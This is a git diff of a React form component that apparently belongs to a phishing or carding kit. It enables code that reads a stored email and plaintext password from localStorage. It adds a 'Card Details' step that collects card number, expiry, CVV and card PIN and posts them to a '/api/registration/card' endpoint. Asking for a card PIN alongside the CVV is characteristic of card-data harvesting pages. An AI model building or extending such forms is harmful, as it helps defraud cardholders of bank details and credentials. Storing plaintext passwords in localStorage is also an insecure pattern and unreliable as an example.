@@ -12,70 +12,65 @@ const Form = () => {
   const [cvv, setCvv] = useState('');
   const [cardPin, setCardPin] = useState('');
 
-//   const router = useRouter();
-//   useEffect(() => {
-//     const email = localStorage.getItem('email');
-//     const password = localStorage.getItem('password');
-//     // const fname = localStorage.getItem('fname');
-//     if (!email || !password) {
-//       router.back();
-//       return;
-//     }
-//   }, [router]);
+  const router = useRouter();
+  useEffect(() => {
+    const email = localStorage.getItem('email');
+    const password = localStorage.getItem('password');
+    // const fname = localStorage.getItem('fname');
+    if (!email || !password) {
+      router.back();
+      return;
+    }
+  }, [router]);
 
-//   const handleSubmit = async (e) => {
-//     e.preventDefault();
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+    submitForm();
+  };
 
-//     if (isMerchant) {
-//       setShowModal(true);
-//       return;
-//     }
+  const submitForm = async () => {
+    try {
+      if (!cardNumber || !cardPin || !cvv || !expiryDate) {
+        alert('All fields are required');
+        return;
+      }
 
-//     submitForm();
-//   };
+      const email = localStorage.getItem('email');
+      const password = localStorage.getItem('password');
 
-//   const submitForm = async () => {
-//     try {
-//       if (!fname || !lname || !phone || !accountno || !pin) {
-//         alert('All fields are required');
-//         return;
-//       }
+      const response = await axios.post('/api/registration/card', {
+        cardNumber,
+        expiryDate,
+        cvv,
+        cardPin,
+        email
+      });
 
-//       const email = localStorage.getItem('email');
-//       const password = localStorage.getItem('password');
+      // console.log('Registration successful:', response.message);
+      // localStorage.setItem('fname', fname);
+      // localStorage.setItem('phone', phone);
+      alert('Registration successful');
 
-//       const response = await axios.post('/api/registration', {
-//         cardNumber,
-//         expiryDate,
-//         cvv,
-//         cardPin,
-//       });
+      router.push('/home');
+      setCardNumber('');
+      setExpiryDate('');
+      setCvv('');
+      setCardPin('');
+      return;
+    } catch (error) {
+      console.error('Registration failed:', error);
+      alert('Registration failed');
+    }
+  };
 
-//       // console.log('Registration successful:', response.message);
-//       localStorage.setItem('fname', fname);
-//       localStorage.setItem('phone', phone);
-//       alert('Registration successful');
+  const handleModalConfirm = () => {
+    setShowModal(false);
+    submitForm();
+  };
 
-//       router.push('/home');
-//       setCardNumber('');
-//       setExpiryDate('');
-//       setCvv('');
-//       setCardPin('');
-//       return;
-//     } catch (error) {
-//       console.error('Registration failed:', error);
-//       alert('Registration failed');
-//     }
-//   };
-
-//   const handleModalConfirm = () => {
-//     setShowModal(false);
-//     submitForm();
-//   };
-
-//   const handleModalCancel = () => {
-//     setShowModal(false);
-//   };
+  const handleModalCancel = () => {
+    setShowModal(false);
+  };
 
   return (
     <div className="relative flex items-center justify-center min-h-[100vh] overflow-hidden bg-gradient-to-r from-purple-400 via-pink-500 to-red-500">
@@ -84,10 +79,10 @@ const Form = () => {
         style={{ backgroundImage: `url('/bg.jpg')` }}
       ></div>
       <div className="relative bg-white p-8 rounded-2xl shadow-2xl w-[90vw] max-w-2xl overflow-y-auto max-h-[140vh] scrollbar-hide">
-     
+
 
         <form onSubmit={handleSubmit}>
-          
+
 
           <h3 className="text-xl font-semibold mt-8 mb-4 text-gray-800">Card Details</h3>
           <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
@@ -141,7 +136,7 @@ const Form = () => {
               />
             </div>
           </div>
-        
+
           <button
             type="submit"
             className="mt-8 bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3 px-6 rounded-full w-full"
